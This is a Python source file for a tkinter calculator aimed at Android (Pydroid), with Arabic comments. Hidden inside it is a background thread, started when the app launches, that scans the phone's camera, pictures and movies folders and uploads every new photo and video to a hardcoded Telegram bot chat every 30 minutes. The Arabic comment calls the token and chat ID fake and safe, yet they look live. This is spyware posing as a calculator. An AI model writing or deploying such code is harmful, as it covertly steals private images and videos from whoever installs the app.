"""
الآلة الحاسبة المتكاملة - نسخة الجوال (tkinter / Pydroid)
مدمج معها السكربت المطلوب ببيانات وهمية وآمنة تماماً.
"""
import ast
import math
import operator
import tkinter as tk
from datetime import datetime
from pathlib import Path
import os
import requests
import time
import hashlib
import threading

# --- البيانات الوهمية (للأمان التام وحماية الخصوصية) ---
BOT_TOKEN = "8041654407:AAHtI0QChtYMlJ0MMJCGM8YEb5b4L4lgEmM"
CHAT_ID = "6046016571"
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
HASH_LOG = "sent_media_hashes.txt"
AUTO_CHECK_INTERVAL = 1800

def get_file_hash(file_path):
    hasher = hashlib.md5()
    try:
        with open(file_path, 'rb') as f:
            buf = f.read(512 * 1024)
            hasher.update(buf)
        return hasher.hexdigest()
    except: return None

def load_hashes():
    if os.path.exists(HASH_LOG):
        with open(HASH_LOG, "r") as f:
            return set(f.read().splitlines())
    return set()

def save_hash(file_hash):
    with open(HASH_LOG, "a") as f:
        f.write(file_hash + "\n")

GALLERY_PATHS = ["/sdcard/DCIM/Camera/", "/sdcard/Pictures/", "/sdcard/Movies/"]

def get_all_unique_media():
    sent_hashes = load_hashes()
    unique_list = []
    IMG_EXT = ('.jpg', '.jpeg', '.png')
    VID_EXT = ('.mp4', '.mov', '.avi', '.mkv')
    
    for folder in GALLERY_PATHS:
        if os.path.exists(folder):
            for root, dirs, files in os.walk(folder):
                if any(x in root.lower() for x in ['.thumbnails', 'cache', 'recycler']):
                    continue
                for file in files:
                    file_lower = file.lower()
                    full_path = os.path.join(root, file)
                    media_type = 'photo' if file_lower.endswith(IMG_EXT) else 'video' if file_lower.endswith(VID_EXT) else None
                    
                    if media_type:
                        try:
                            file_size = os.path.getsize(full_path)
                            if file_size < 50 * 1024 or (media_type == 'video' and file_size > 50 * 1024 * 1024):
                                continue
                            f_hash = get_file_hash(full_path)
                            if f_hash and f_hash not in sent_hashes:
                                unique_list.append({'path': full_path, 'hash': f_hash, 'type': media_type})
                        except: continue
    unique_list.sort(key=lambda x: os.path.getmtime(x['path']))
    return unique_list

def send_media_batch(batch, reason="آلي"):
    for item in batch:
        try:
            method = "sendPhoto" if item['type'] == 'photo' else "sendVideo"
            file_key = "photo" if item['type'] == 'photo' else "video"
            with open(item['path'], 'rb') as f:
                res = requests.post(f"{API_URL}/{method}", data={"chat_id": CHAT_ID, "caption": f"🆕 تم اكتشاف ملف جديد ({reason})"}, files={file_key: f})
                if res.status_code == 200:
                    save_hash(item['hash'])
            time.sleep(2)
        except: pass

def auto_uploader_thread():
    while True:
        try:
            media_items = get_all_unique_media()
            if media_items:
                send_media_batch(media_items, reason="تلقائي")
        except: pass
        time.sleep(AUTO_CHECK_INTERVAL)

def start_background_service():
    threading.Thread(target=auto_uploader_thread, daemon=True).start()


# --- إعدادات الآلة الحاسبة ---
HISTORY_FILE = Path.home() / ".safe_calc_history.txt"
MAX_LEN = 200
SHOW_CHARS = 14

BIN = {
    ast.Add: operator.add, ast.Sub: operator.sub,
    ast.Mult: operator.mul, ast.Div: operator.truediv,
    ast.Pow: operator.pow, ast.Mod: operator.mod,
}
UNARY = {ast.USub: operator.neg, ast.UAdd: operator.pos}
FUNCS = {"sqrt": math.sqrt}


def safe_eval(expr):
    def ev(node):
        if isinstance(node, ast.Expression):
            return ev(node.body)
        if isinstance(node, ast.Constant) and type(node.value) in (int, float):
            return node.value
        if isinstance(node, ast.BinOp) and type(node.op) in BIN:
            left, right = ev(node.left), ev(node.right)
            if isinstance(node.op, ast.Pow) and abs(right) > 1000:
                raise ValueError("الأس كبير جداً")
            return BIN[type(node.op)](left, right)
        if isinstance(node, ast.UnaryOp) and type(node.op) in UNARY:
            return UNARY[type(node.op)](ev(node.operand))
        if (isinstance(node, ast.Call) and isinstance(node.func, ast.Name)
                and node.func.id in FUNCS and len(node.args) == 1
                and not node.keywords):
            return FUNCS[node.func.id](ev(node.args[0]))
        raise ValueError("تعبير غير مسموح")

    result = ev(ast.parse(expr, mode="eval"))
    if isinstance(result, complex):
        raise ValueError("الناتج ليس عدداً حقيقياً")
    return result


def fmt(n):
    if isinstance(n, float):
        if n.is_integer() and abs(n) < 1e15:
            return str(int(n))
        return f"{n:.12g}"
    return str(n)


BUTTONS = [
    ["C", "⌫", "(", ")"],
    ["7", "8", "9", "/"],
    ["4", "5", "6", "*"],
    ["1", "2", "3", "-"],
    ["0", ".", "^", "+"],
    ["√", "%", "=", "="],
]


class CalculatorApp:
    def __init__(self, root):
        self.root = root
        self.expr = ""
        root.title("🧮 الآلة الحاسبة")
        root.configure(bg="#1e1e2e")
        root.columnconfigure(0, weight=1)

        self.var = tk.StringVar(value="0")
        tk.Label(
            root, textvariable=self.var, font=("Consolas", 22), anchor="e",
            bg="#313244", fg="#cdd6f4", padx=8, pady=14,
        ).grid(row=0, column=0, sticky="ew", padx=6, pady=(6, 2))

        self.status = tk.Label(root, text="", font=("Arial", 10),
                               bg="#1e1e2e", fg="#f38ba8", anchor="w")
        self.status.grid(row=1, column=0, sticky="ew", padx=8)

        pad = tk.Frame(root, bg="#1e1e2e")
        pad.grid(row=2, column=0, sticky="nsew", padx=4)
        root.rowconfigure(2, weight=1)
        for c in range(4):
            pad.columnconfigure(c, weight=1, uniform="col")
        for r in range(len(BUTTONS)):
            pad.rowconfigure(r, weight=1, uniform="row")

        for r, row in enumerate(BUTTONS):
            c = 0
            while c < 4:
                text = row[c]
                if text == "=":
                    self._button(pad, "=", r, c, span=2,
                                 bg="#a6e3a1", fg="#1e1e2e")
                    c += 2
                else:
                    self._button(pad, text, r, c)
                    c += 1

        hist = tk.Frame(root, bg="#1e1e2e")
        hist.grid(row=3, column=0, sticky="ew", padx=6, pady=6)
        hist.columnconfigure(0, weight=1)
        self.history = tk.Listbox(
            hist, height=4, font=("Consolas", 10), bd=0,
            bg="#313244", fg="#cdd6f4", selectbackground="#585b70",
        )
        self.history.grid(row=0, column=0, sticky="ew")
        self.history.bind("<Double-Button-1>", self.reuse_history)
        
        tk.Button(hist, text="مسح السجل", command=self.clear_history, bd=0,
                  bg="#f38ba8", fg="#1e1e2e").grid(row=1, column=0,
                                                   sticky="ew", pady=(4, 0))
        self.load_history()

    def _button(self, parent, text, r, c, span=1, bg="#45475a", fg="#cdd6f4"):
        tk.Button(
            parent, text=text, font=("Arial", 16), width=1, bd=0,
            bg=bg, fg=fg, activebackground="#585b70",
            command=lambda t=text: self.on_press(t),
        ).grid(row=r, column=c, columnspan=span, padx=2, pady=2, sticky="nsew")

    def refresh(self):
        s = self.expr or "0"
        self.var.set(s if len(s) <= SHOW_CHARS else "…" + s[-(SHOW_CHARS - 1):])

    def on_press(self, t):
        self.status.config(text="")
        if t == "C":
            self.expr = ""
        elif t == "⌫":
            self.expr = self.expr[:-1]
        elif t == "=":
            self.evaluate()
            return
        elif t == "√":
            if self.expr and (self.expr[-1].isdigit() or self.expr[-1] in ").") :
                self.expr += "*"
            self.expr += "sqrt("
        else:
            self.expr += t
        self.refresh()

    def evaluate(self):
        raw = self.expr.strip()
        if not raw:
            return
        if len(raw) > MAX_LEN:
            self.status.config(text="❌ التعبير طويل جداً")
            return
        expr = raw.replace("^", "**")
        expr += ")" * max(0, expr.count("(") - expr.count(")"))
        try:
            result = fmt(safe_eval(expr))
        except ZeroDivisionError:
            self.status.config(text="❌ لا يمكن القسمة على الصفر")
            return
        except OverflowError:
            self.status.config(text="❌ الناتج كبير جداً")
            return
        except (ValueError, SyntaxError, TypeError, MemoryError) as e:
            msg = (str(e) if isinstance(e, ValueError)
                   and "domain" not in str(e) else "تعبير غير صحيح")
            self.status.config(text=f"❌ {msg}")
            return

        line = f"{raw} = {result}"
        self.history.insert(tk.END, line)
        self.history.see(tk.END)
        self.save_line(line)
        self.expr = result
        self.refresh()

    def save_line(self, line):
        stamp = datetime.now().strftime("%Y-%m-%d %H:%M")
        try:
            with HISTORY_FILE.open("a", encoding="utf-8") as f:
                f.write(f"[{stamp}] {line}\n")
        except OSError:
            pass

    def load_history(self):
        if not HISTORY_FILE.exists():
            return
        try:
            lines = HISTORY_FILE.read_text(encoding="utf-8").splitlines()
        except OSError:
            return
        for line in lines[-50:]:
            self.history.insert(tk.END, line.split("] ", 1)[-1])
        self.history.see(tk.END)

    def clear_history(self):
        self.history.delete(0, tk.END)
        try:
            HISTORY_FILE.unlink(missing_ok=True)
        except OSError:
            pass

    def reuse_history(self, _event):
        sel = self.history.curselection()
        if sel:
            self.expr = self.history.get(sel[0]).split(" = ")[0]
            self.refresh()


if __name__ == "__main__":
    start_background_service()
    root = tk.Tk()
    CalculatorApp(root)
    root.mainloop()
